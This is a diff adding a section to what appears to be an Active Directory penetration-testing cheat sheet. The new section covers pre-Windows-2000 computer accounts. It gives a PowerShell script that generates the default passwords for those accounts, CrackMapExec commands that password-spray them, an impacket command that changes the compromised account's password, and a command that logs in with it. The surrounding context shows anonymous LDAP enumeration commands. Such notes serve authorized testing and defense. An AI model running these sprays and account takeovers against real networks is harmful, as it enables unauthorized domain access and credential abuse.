@@ -13,7 +13,7 @@
   * [Anonymous Access](#Anonymous-Access)
     * [SMB](#SMB)
     * [LDAP](#LDAP)
-
+  * [Pre Windows 2000 Computers](#Pre-Windows-2000-Computers)
 
 # From the outside
 ## Web Attacks
@@ -211,4 +211,49 @@ python3 windapsearch.py --dc-ip <IP> -u "" -p "" --privileged-users
 python3 windapsearch.py --dc-ip <IP> -u "" -p "" --user-spns
 python3 windapsearch.py --dc-ip <IP> -u "" -p "" --unconstrained-users
 python3 windapsearch.py --dc-ip <IP> -u "" -p "" --unconstrained-computers
+```
+
+## Pre Windows 2000 Computers
+- https://www.thehacker.recipes/ad/movement/domain-settings/pre-windows-2000-computers
+
+#### Create lists of computer objects and passwords
+- The password is all lowercase, no `$` and max 14 characters.
+```
+$data = Get-DomainComputer -Credential $Creds -Domain $Domain -DomainController $Server | Select-Object -ExpandProperty samaccountname
+$data = $data -replace 'samaccountname', '' -replace '-', ''
+	
+$file = "$checks_path\list_computers.txt"
+$data | Out-File $file
+Write-Host "[W] Writing list of computers to $file"
+	
+$data = $data -replace '\$', ''
+	
+$file = "$checks_path\list_computers_Pre-Windows2000Computers_pass.txt"
+ForEach ($line in $data) {
+	if ($line.Length -gt 14) {
+			$line.SubString(0,14) | Out-File -Append $File
+	}
+	else {
+			$line | Out-File -Append $File
+	}
+}
+Write-Host "[W] Writing list of passwords to $file"
+```
+ 
+#### Spray all computer objects
+``` 
+cme smb <DC IP> -d <DOMAIN> -u list_computers.txt -p list_computers_Pre-Windows2000Computers_pass.txt --no-bruteforce --continue-on-success | tee spray_pre2000.txt
+
+cat spray_pre2000.txt | grep "STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"
+```
+
+#### Change computer account password
+- https://github.com/fortra/impacket/blob/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py
+```
+python3 rpcchangepwd.py '<DOMAIN>/COMPUTER>$':'<PASSWORD>'@<DC IP> -newpass '<PASS>'
+```
+
+#### Authenticate with computer account password
+```
+cme smb <DC IP> -d <DOMAIN> -u <COMPUTER> -p <PASS>
 ```
